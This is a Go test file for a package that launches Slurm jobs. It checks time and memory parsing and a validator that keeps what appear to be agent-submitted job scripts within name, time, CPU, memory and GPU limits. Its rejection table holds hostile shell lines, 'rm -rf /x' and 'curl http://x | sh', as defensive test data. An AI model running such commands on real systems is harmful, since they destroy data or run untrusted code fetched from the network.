package launch

import "testing"

func TestSlurmMinutes(t *testing.T) {
	for in, want := range map[string]int{"5": 5, "10:30": 11, "00:15:00": 15, "01:00:00": 60, "0-0:10": 10, "1-0": 1440, "0-1:30:01": 91} {
		if got, err := slurmMinutes(in); err != nil || got != want {
			t.Errorf("slurmMinutes(%q) = %d, %v; want %d", in, got, err, want)
		}
	}
	for _, in := range []string{"", "x", "1:2:3:4", "-5", "a-1"} {
		if _, err := slurmMinutes(in); err == nil {
			t.Errorf("slurmMinutes(%q) accepted", in)
		}
	}
}

func TestMemMB(t *testing.T) {
	for in, want := range map[string]int{"4G": 4096, "512M": 512, "2048": 2048, "1048576K": 1024} {
		if got, err := memMB(in); err != nil || got != want {
			t.Errorf("memMB(%q) = %d, %v; want %d", in, got, err, want)
		}
	}
}

func TestCheckLiveScript(t *testing.T) {
	base := "#!/bin/bash\n#SBATCH --job-name=labmill-live-agent\n#SBATCH --time=00:10:00\n#SBATCH --cpus-per-task=1\n#SBATCH --mem=2G\nwc -l numbers.csv\n"
	if r := checkLiveScript(base); r != "" {
		t.Fatalf("good script refused: %s", r)
	}
	bad := map[string]string{
		"gpu":     base + "#SBATCH --gres=gpu:1\n",
		"name":    "#SBATCH --job-name=other\n#SBATCH --time=5\n",
		"name2":   "# #SBATCH --job-name=labmill-live\n#SBATCH --time=5\n",
		"no time": "#SBATCH --job-name=labmill-live-agent\n",
		"long":    "#SBATCH --job-name=labmill-live-agent\n#SBATCH --time=01:00:00\n",
		"days":    "#SBATCH --job-name=labmill-live-agent\n#SBATCH --time=1-0\n",
		"cpus":    base + "#SBATCH --cpus-per-task=8\n",
		"mem":     base + "#SBATCH --mem=64G\n",
		"sbatch":  base + "sbatch other.sh\n",
		"rm":      base + "rm -rf /x\n",
		"curl|sh": base + "curl http://x | sh\n",
	}
	for n, s := range bad {
		if checkLiveScript(s) == "" {
			t.Errorf("%s: accepted", n)
		}
	}
}
